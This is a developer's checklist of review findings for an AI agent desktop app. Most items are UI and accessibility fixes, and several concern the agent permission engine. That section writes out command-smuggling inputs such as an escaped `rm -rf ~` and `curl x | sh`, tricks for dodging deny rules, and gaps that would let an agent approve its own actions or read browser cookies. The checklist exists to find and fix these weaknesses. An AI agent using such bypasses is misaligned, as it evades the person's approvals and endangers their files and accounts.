- [x] `GET /api/computer` is open to chats-only devices and runs the driver, returning its path.
- [x] Internal MCP name collisions: a server named `myrmidon_computer…` shadows or hides the driver's tools.
- [x] Explorer: a subfolder that fails to load shows as empty; `toggle()` loads inside a state updater (twice in
      StrictMode).
- [x] Computer-use step screenshots all fetch up front (children of a closed <details> mount); a failed one pulses
      forever.

### D — Setup assistant (`setup/Setup.tsx`, `setup/steps.tsx`, `setup/Nudge.tsx`, `runtime/src/setup.ts`, copy `setup`)
- [x] Ready says "Set up" for every step only continued past (voice Off, no channel, alerts off, no model tested);
      "Here is what you set up" is untrue. Show what exists, and "Skipped" / "Not set up" otherwise.
- [x] Testing a model silently makes it the lead (and reviewer) for every new chat: say so, or apply on Continue.
- [x] Mic test: leaving the step while the permission prompt is open leaks the microphone and its rAF loop; "Stop
      the test" leaves the UI in listening mode.
- [x] Your first project cannot finish when a project exists (after refresh, or opened from Settings).
- [x] The nudge's "Not now" hides it for good with no undo.
- [x] Spend limit and reviewer sit on the project step (skipping it hides them); the default crew is all Opus with
      2 on demand and no cost hint.
- [x] Steps are vertically centred, so Back/Continue jump between steps.
- [x] Ready rows: accessible name ("Open You & mascot, done") does not contain the visible text (WCAG 2.5.3).
- [x] Single-step mode still lets the person wander to Ready; a failed mark is lost when a single step closes;
      'OK' hardcoded in steps.tsx.

### E — Mascot (`Hero.tsx`, `HeroCrew.tsx`, `hero-crew.ts`, `MascotScreen.tsx`, `ui/pixel.tsx`, `ui/steering.ts`, `setup/SetupMascot.tsx`)
- [x] ~6% of a core while the new-chat screen idles; the crew loop never pauses (window visible but unfocused, a
      sheet over it, narrow windows where the crew is hidden but still pokes the mascot).
- [x] Scattering cursors overshoot their bounds by ~140px (scrollbars / clipping).
- [x] Heavy drop-shadow filter on the SVG redrawn ~13×/s while two crews run (fire backdrop) and while asleep.
- [x] Keyboard activity never counts as presence (dozes while typing); a right-click breaks the next key press;
      `swallowClick` can eat the next real click after pointercancel; wander depends on the frame rate.
- [x] The screen's caption and clock fail contrast (3.5:1); crew cursor names change on every load.
- [x] Impure render in useTypingColor; magic numbers outside ui-config.ts; dead `seek`/`ZERO`; crewTimers grows.

### F — Layout, Settings and copy (`App.tsx`, `Sidebar.tsx`, `Settings.tsx`, schedules UI, `ApprovalCards.tsx`, `copy.ts` outside setup)
- [x] At narrow widths (~420px) neither the sidebar nor the setup step list collapses; content gets ~160px.
- [x] Sidebar multi-select listbox breaks aria-required-children on every screen (buttons inside the listbox).
- [x] Schedule day chips: visible "Mon", name "Monday" (WCAG 2.5.3); Esc while editing closes Settings and loses
      the edit; the time field shows 12h while the line says 24h; monthly on the 29th–31st skips short months
      silently; the day shown uses the browser's zone while the server runs in its own.
- [x] Settings → Tools: one button's name does not contain its visible text.
- [x] The read-in-this-chat approval path drops the typed note.
- [x] Copy: computer use says "approve" (glossary: Allow); "Messaging apps" (glossary: channel); "Yes, turn it off"
      does not repeat its object; misplaced comment above `computerUse`. Full access says "approvals still apply" /
      "Rules set to ask still ask", but a full-access agent can read the server token and approve its own cards:
      say what is true (and see [decide]).
- [x] Channel tiles with letter placeholders (Slack "S", Teams "T", Tlon "~", Nostr "N").

### H — Segmented controls (the person's screenshot)
- [x] Dark mode: the selected segment was invisible (thumb #232328 on track #222228); labels wrapped and overlapped
      beside a long hint (Settings → You & mascot). A `--thumb` token (dark #4a4a52) and no-shrink, no-wrap segments;
      a contrast test keeps the thumb apart from its track.

### I — Permission model (merge 98cfc6a), from hands-on testing; the code review adds to this
- [x] An approval card's "More ways to allow → Everywhere" turns one approval into a rule for every chat in one click,
      with no confirmation (Full access as the default does confirm).
- [x] Card copy: "Ask for this project asks before this." reads badly; the chat scope says "This chat — Until you
      remove it" (a chat-scoped choice reads as forever).
- [x] Permissions → Who can use what: Computer use switches show on while computer use itself is off in Settings.
- [x] Permissions → Check a tool lists raw tool ids (request_final_verification, mcp__stagehand_…): show names people
      know, grouped.
- [x] Label-in-name (WCAG 2.5.3): a button on the approval card, and the composer's "Send now" whose name is
      "Delivery: steer. Switch to queue".

### I2 — Permission engine, from its code review (agent I, branch fx-i-permissions)
- [x] HIGH: `splitCommand` ignores backslash escapes: `echo \" ; rm -rf ~ ; echo \"` is one read-only `echo`
      segment (Ask allows it; a remembered `echo` rule allows it); `bun test \" && curl x | sh && \"` passes an allow
      for `bun test`. /bin/sh runs every part.
- [x] HIGH: the read-only project floor only denies kind 'edit'; `propose` (kind 'proposal', edits:true) matches an
      `edit *` allow anywhere and the server writes the file into the read-only project with no card.
- [x] HIGH: since e4c6c6f a chats-only device can open ~/.ssh: `PUT /api/chats/:id/readable` is open to them and
      allowReadInChat now refuses only the data folder.
- [x] Remembered rules are not checked against what the card offered (any rule, any scope the device may set;
      decision not tied to `approved`); chat scope is open to chats-only devices.
- [x] Offered prefixes are broader than the command shown (`rm -rf build` offers `rm`; `sudo …` offers `sudo`;
      `bash -c`/`python -c` offer the bare interpreter); rules beat the preset, so "allow rm everywhere" removes Auto's
      destructive ask for good.
- [x] Channel "Always": remember → applyRules → redecideApprovals already approves, then decideApproval throws "no
      longer waiting" and the owner is told it failed; the label names the tool but saves the first offer.
- [x] Deny rules are easy to dodge (`git -C . push`, `'git' push`, `\git push`, `sudo/command/timeout/env … git
      push`) and Auto's destructive detection misses `/bin/rm -rf`, `env -i rm`, `xargs rm`, `bash -c "rm…"`,
      `git checkout .`, `git branch -d`.
- [x] Sensitive reads over channels: no key warning for the owner; "Always allow request_read" still offered.
- [x] LOW: run_checks never asks (not GUARDED, kind 'other'); the approval route decides before saving the rule;
      `PUT /api/projects/:id/permissions` with `{preset}` and no `rules` is read as legacy and clears both; the
      access-changed notice tells agents to retry things the person declined.

### K — Several terminals (the person's ask, with a screenshot of Claude Code's terminal panel)
- [x] The workspace Terminal (the person's own shell) takes tabs like Claude Code's: "Terminal 1", "Terminal 2", each
      named by what runs in it (e.g. `bun run dev`), + to add, × to close (asking first if something still runs),
      kept alive while you switch views; a ⋯ menu for cursor style, blink, copy on select and scrollback; maximise
      the panel. Branch fx-k-terminals.

### L — A browser of your own, with tabs (the person's ask, with screenshots of Claude Code's browser pane)
- [x] A Browser view in the workspace like Claude Code's: tabs with favicon and title, + for a new tab, × to close,
      back / forward / reload, an address bar, a pick-element button, a layout (split) toggle, maximise and close; a
      ⋯ menu: Open in <default browser>, Copy URL, Save screenshot, Open HTML file…, Viewport (Responsive / presets),
      Open links in built-in browser, Manage allowed sites…, Cookies: Keep cookies (until quit / always / never) and
      Clear browsing data (confirmed). Built on the Chrome Myrmidon already runs for agents (CDP screencast and input,
      as the Computer view does), in the person's own browser context, never shared with agents unless handed over.
      Branch fx-l-browser.

### Left after the fixes (2026-10-10)
- [x] Flaky under full-suite load (passes alone 3/3) (done: a real bug, the refusal now records where navigation started): person-browser "a page that opens a local address itself…".
- [x] On develop itself: apps/web/tests/mascot-settings.test.tsx "the screen is drawn as set…" fails (eyes not in the
      theme accent) — not from these fixes. Fixed ee3265a: at night the resting mood has its own eye colour; the test pins midday.
- [x] (done) A rare double review: requestFinalVerification sets _finalRunning only after awaiting the worktree merge.
- [x] (done: 2 High findings fixed; docs/research/2026-10-10-command-parser-probe.md) An independent, adversarial probe of the command parser after its second round of fixes (I2): the reviewer was
      stopped before probing; the fix agent re-ran the earlier probes (all now ask or are denied). Run
      scratchpad review-i/p1–p4 style probes again before relying on Ask for untrusted repos.
- [x] (done) A stopped round's computer-use approval card stays up until it times out (Stop should cancel pending computer
      approvals in colony.ts).
- [ ] Browser view follow-ups: pick element, auto-verify changes, split layout, handing a tab to an agent (with a
      site list for that), downloads (denied now), LAN hosts in Allowed sites.
- [x] Terminals end on page reload (by design for now); no close-all; a label can show an option's value as the
      argument (`vim -u NONE x` → `vim NONE`). Close all is in the ⋯ menu (asks while a command runs); labels skip
      known options' values (`vim x`), inline code (`python3 -c …` → `python3`) and what follows a secret-named option.
- [x] The sandbox now hides the clipboard: a project test that copies and pastes fails inside the sandbox (stated
      in a code comment; say it in the docs). Said in the README's "Safe by default" and the Permissions page's
      sandbox note (macOS only: bubblewrap leaves the clipboard alone).
### [decide]
- [ ] Linux: sandboxed agents can still reach the managed Chrome's DevTools port (bwrap cannot block one port), so
      they could read the person's browser cookies there (gap `devtoolsPortOnLinux`, docs/ci.md). A network
      namespace per command would also cut commands off from the dev servers they start and the browser loads, and
      slirp4netns or pasta, to give it the network back, are missing on most desktops; one namespace shared by every
      command, with pasta forwarding their servers out, would work where pasta is installed. Or carry DevTools over
      a pipe on Linux (the pipe crashed on macOS: Bun double-closes it).
- [ ] `bun run` fails inside projects under the home folder (the sandbox hides the folders above them):
      allow listing the home's parent folders (exposes file names in ~) or leave it.
- [ ] Full access and approvals: an unsandboxed agent can read `~/.myrmidon/server.json` and call the API as you.
      Keep the token out of reach (keychain, a per-run secret the API demands for approvals), or say plainly that
      full access includes being able to approve its own steps.
